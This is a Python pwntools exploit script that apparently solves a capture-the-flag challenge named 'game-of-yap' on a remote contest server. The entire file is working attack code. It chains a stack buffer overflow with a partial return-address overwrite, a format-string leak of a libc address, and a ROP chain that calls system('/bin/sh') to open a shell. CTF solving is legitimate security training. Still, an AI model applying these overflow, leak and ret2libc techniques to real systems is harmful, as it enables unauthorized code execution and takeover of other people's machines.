#!/usr/bin/env python3
from pwn import *

binary = "./game-of-yap"
remote_addr = "yap.chal.cyberjousting.com"
remote_port = 1355

elf = context.binary = ELF(binary, checksec=False)
libc = ELF("./libc.so.6", checksec=False)

gs = """
break *(play+42)
break *(yap+40)
continue
"""

def run():
    if args.REMOTE:
        return remote(remote_addr, remote_port)
    elif args.GDB:
        context.terminal = ["tmux", "splitw", "-h", "-l", "120"]
        try:
            return gdb.debug(binary, gdbscript=gs)
        except ValueError:
            print("ERROR: tmux not active")
        exit(1)
    else:
        return elf.process()

p = run()

##### Pwn #####
mov_rdi_rsi = 0x1243

# First exploit
p.recvuntil(b"Here's your first chance...\n")
payload = flat(
    b'A'*264,
    ((elf.sym['yap'] + 8) & 0xff).to_bytes()
)
p.send(payload)

leak = p.recvline()
elf.address = int(leak, 16) - elf.sym['play']
print('ELF base:', hex(elf.address))

# Second exploit
p.recvuntil(b'One more try...\n')
payload = flat(
    '%27$p'.ljust(264, 'A').encode(),
    p64(elf.address + mov_rdi_rsi),
    p64(elf.plt['printf']),
    p64(elf.sym['play']+4)
)
p.send(payload)

leak = p.recvuntil(b'AAA', drop=True)
libc.address = int(leak, 16) - 0x228b - 0x28000
print('libc system:', hex(libc.sym['system']))

# Final exploit
rop = ROP(libc)
payload = flat(
    b'A'*264,
    p64(rop.rdi.address),
    p64(next(libc.search(b'/bin/sh'))),
    p64(libc.sym['system'])
)
p.send(payload)
p.recv()

p.interactive()
